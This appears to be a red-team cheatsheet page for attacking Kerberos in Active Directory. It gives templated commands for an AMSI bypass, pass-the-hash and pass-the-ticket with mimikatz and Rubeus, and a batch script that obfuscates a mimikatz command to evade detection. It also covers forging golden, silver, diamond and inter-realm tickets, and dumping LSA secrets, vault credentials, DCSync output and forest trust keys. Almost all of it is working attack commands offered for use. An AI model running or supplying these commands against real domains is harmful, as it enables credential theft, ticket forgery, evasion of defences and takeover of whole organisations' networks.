---
layout: post
title: credentials / krb
category: 04-credentials
parent: cheatsheets
modified_date: 2025-02-05
permalink: /creds/krb
---

**Mitre Att&ck Entreprise**: [T1558 Steal and Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) 

**Menu**
<!-- vscode-markdown-toc -->
* [tools](#tools)
* [runas](#runas)
* [pass-the-ticket](#pass-the-ticket)
	* [pth](#pth)
	* [ptt](#ptt)
	* [command-obfuscation](#command-obfuscation)
* [forge](#forge)
	* [tgt](#tgt)
	* [diamond](#diamond)
	* [golden](#golden)
	* [silver](#silver)
	* [silver-ea](#silver-ea)
	* [referral](#referral)
* [dump](#dump)
	* [vault](#vault)
	* [lsadump-lsa](#lsadump-lsa)
	* [lsadump-dcsync](#lsadump-dcsync)
	* [lsadump-trust](#lsadump-trust)
* [manipulate](#manipulate)
	* [cleartext-2-nthash](#cleartext-2-nthash)
	* [ccache-convert](#ccache-convert)
	* [krb-export](#krb-export)
* [which-os-what-creds](#which-os-what-creds)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->



## <a name='tools'></a>tools

<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<script>$(window).load(function() {var mm = ["https://api.github.com/repos/GhostPack/Rubeus","https://api.github.com/repos/Flangvik/BetterSafetyKatz","https://api.github.com/repos/gentilkiwi/mimikatz","https://api.github.com/repos/zer1t0/cerbero","https://api.github.com/repos/skelsec/pypykatz"]; for (rep in mm) {$.ajax({type: "GET", url: mm[rep], dataType: "json", success: function(result) {$("#mm_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.pushed_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>

<link href="/sortable.css" rel="stylesheet" />
<script src="/sortable.js"></script>
<div id="mm">
    <table id="mm_list" class="sortable">
      <tr><th>_repo</th><th>_last_pushed</th><th>_stars</th><th>_watch</th><th>_language</th></tr>
    </table>
</div>


## <a name='runas'></a>runas

```powershell
runas /user:XXX\XXX /netonly cmd
# Enter the password for XXX\XXX:

C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
iex (get-content .\amsibypass.txt)

$ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode FullLanguage

$ErrorActionPreference = 'SilentlyContinue' # hide errors on out console
```

* [/discov/setenv](/discov/setenv)
* [/discov/ad#iter](/discov/ad#iter)

## <a name='pass-the-ticket'></a>pass-the-ticket

### <a name='pth'></a>pth

```powershell
# load powershell with PTH
mimikatz.exe
privilege::debug
sekurlsa::pth /user:$ztarg_user_name /rc4:xxx  /domain:$zdom /dc:$zdom_dc_fqdn /run:"powershell -ep bypass"

# load cmd with PTH
Rubeus.exe -args asktgt /user:$ztarg_user_name /aes256:$ztarg_user_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
${zloader} -Path .\Rubeus.exe -args asktgt /user:$ztarg_user_name /aes256:$ztarg_user_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# load cmd with PTH / go to command-obfuscation for %Pwn% variable
Rubeus.exe -args %Pwn% /user:$ztarg_user_name /aes256:$ztarg_krb_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### <a name='ptt'></a>ptt
```bash
# ptt via DInvoke
C:\USers\Public\zloader.exe -path .\Rubeus.exe -args asktgt /user:$ztarg_user_name /aes256:$ztarg_user_aes256k /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_nthash /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_nthash /createnetonly:C:\Windows\System32\cmd.exe
```

### <a name='command-obfuscation'></a>command-obfuscation
```bat
REM script file to obfuscate the token manipulation commands 
 @echo off
set "z=s"
set "y=y"
set "x=e"
set "w=k"
set "v=e"
set "u=:"
set "t=:"
set "s=a"
set "r=s"
set "q=l"
set "p=r"
set "o=u"
set "n=k"
set "m=e"
set "l=s"
set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
echo %Pwn%
C:\Users\Public\SafetyKatz.exe %Pwn% exit
```

## <a name='forge'></a>forge

### <a name='tgt'></a>tgt
```powershell
# inter-realm TGT / ZDOM TO ZFOREST
.\Loader.exe -path .\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:${zdom_fqdn} /sid:${zdom_sid} /sids:${zea_sid} /aes256:${zdom_krbtgt_aes256k} /netbios:${znbss} /ptt

# TO TEST
#cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_dc_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
#cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_computer_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
#
#./Rubeus.exe asktgt /user:$ztarg_user_name /password:$ztarg_user_pass /domain:$zdom /dc:$zdom_dc_fqdn /ptt
#Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

### <a name='diamond'></a>diamond

* TGT modification, avoid detection of forged TGT without PREAUTH 
* requires the KRBTGT$ account hash
* [+] Process : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9

```powershell
#$zdom_krbtgt_aes256k=""
C:\Users\Public\Loader.exe -path .\Rubeus.exe -args diamond /krbkey:${zdom_krbtgt_aes256k} /tgtdeleg /enctype:aes /ticketuser:administrator /domain:${zdom_fqdn} /dc:${zdom_dc_fqdn} /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### <a name='golden'></a>golden

* TGT forging, there is no PREAUTH / Kerberos AS-REQ, AS-REP exchanges with the DC
* requires the KRBTGT$ account hash

```powershell
#$zdom_krbtgt_aes256k=""
#$zdom_krbtgt_norid=""
# 01 # CMD TO RUN
C:\Users\Public\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:${zdom_krbtgt_aes256k} /sid:${zdom_krbtgt_norid} /ldap /user:Administrator /printcmd
# 02 # BUILT CMD TO COPY/PASTE
C:\Users\Public\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:${zdom_krbtgt_aes256k} /user:Administrator /id:500 /pgid:513 /domain:${zdom_fqdn} /sid:${zdom_krbtgt_norid} /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:${zdom_dc_fqdn} /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

### <a name='silver'></a>silver

* service account hash required to forgort a TGS
* it is mostly the machine account hash, valid for 30 days by default
* more silent than the golden ticket, no kerberos interaction with the DC (aka no AS-REQ, TGS-REQ)
* SPN service can be change by any valid one, not restricted to msds-AllowedToDelegateTo

```powershell
# SILVER TICKET AS Domain Admin (DA)
#$zdom_krbtgt_aes256k=""
#$zdom_krbtgt_norid=""
C:\Users\Public\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/${zdom_dc_fqdn} /aes256:${zdom_krbtgt_aes256k} /sid:${zdom_krbtgt_norid} /ldap /user:Administrator /domain:${zdom_fqdn} /ptt
```

### <a name='silver-ea'></a>silver-ea
```powershell
# 01 # forge a silver ticket AS Enterprise Administrator (EA) 
C:\AD\Tools>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/${zdom_fqdn} /rc4:${zforest_krbtgt_nthash} /sid:${zdom_sid} /sids:${zea_sid}-519 /ldap /user:Administrator /nowrap

# 02 # import the ticket
.\Loader.exe -path .\Rubeus.exe -args asktgs /service:http/${zforest_dc_fqdn} /dc:${zforest_dc_fqdn} /ptt /ticket:doIFX...==
```

| Service Type 				| 	Service Silver Tickets 	|
|---------------------------|---------------------------|
| WMI						| HOST RPCSS				|
| PowerShell Remoting 		| HOST HTTP (WSMAN RPCSS)	|
| WinRM						| HOST HTTP	 	 			|
| Scheduled Tasks 			| HOST 						| 
| Windows File Share (CIFS) | CIFS 						|
| LDAP operations (DCSync)  | LDAP 						|	
| Windows RSAT 				| RPCSS LDAP CIFS 			|	
| Windows RSAT 				| RPCSS LDAP CIFS 			|	


### <a name='referral'></a>referral
```powershell
# 01 #
#$zdom_sid
#$zdom_trustk
.\Loader.exe -path .\Rubeus.exe -args evasive-silver /service:krbtgt/${zdom_fqdn} /rc4:${zdom_trustk} /sid:${zdom_sid} /ldap /user:Administrator /nowrap

# 02 # import the ticket 
.\Loader.exe -path .\Rubeus.exe -args asktgs /service:cifs/${zdom_dc_fqdn} /dc:${zdom_dc_fqdn} /ptt /ticket:doIFX...==
```

## <a name='dump'></a>dump

### <a name='vault'></a>vault
```powershell
# contains secrets for the: scheduled tasks, ...
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```

### <a name='lsadump-lsa'></a>lsadump-lsa
```powershell
# dump lsa process
Invoke-Mimi -Command '"token::elevate" "lsadump::lsa /patch"'
Invoke-Mimi -Command '"token::elevate" "sekurlsa::evasive-keys /patch"'
```

### <a name='lsadump-dcsync'></a>lsadump-dcsync
```powershell
# dcsync
#$znbss=""
#$ztarg_user_name="krbtgt"
#$zx=$znbss+"\"+$ztarg_user_name
.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:${zx}" "exit"
Invoke-Mimi -Command '"token::elevate" "lsadump::dcsync"'
```

### <a name='lsadump-trust'></a>lsadump-trust
```powershell
# dump the krbtgt of the forest
.\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```



## <a name='manipulate'></a>manipulate

### <a name='cleartext-2-nthash'></a>cleartext-2-nthash
```powershell
# compute nthash from clear-text password
cerbero hash $ztarg_user_pass -u $zdom_fqdn/$ztarg_user_name
$ztarg_user_nthash=""
$ztarg_user_aes256k=""
```

### <a name='ccache-convert'></a>ccache-convert

```python
# Convert linux to windows krb ticket :
ticketConverter.py $ztarg_user_name".ccache" $ztarg_user_name".krb"
cerbero convert -i $ztarg_user_name".ccache" -o $ztarg_user_name".krb"
```

### <a name='krb-export'></a>krb-export
```powershell
cd C:\tools\mimikatz\x64
mimikatz.exe privilege:debug
kerberos::list /export
```

## <a name='which-os-what-creds'></a>which-os-what-creds

![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)
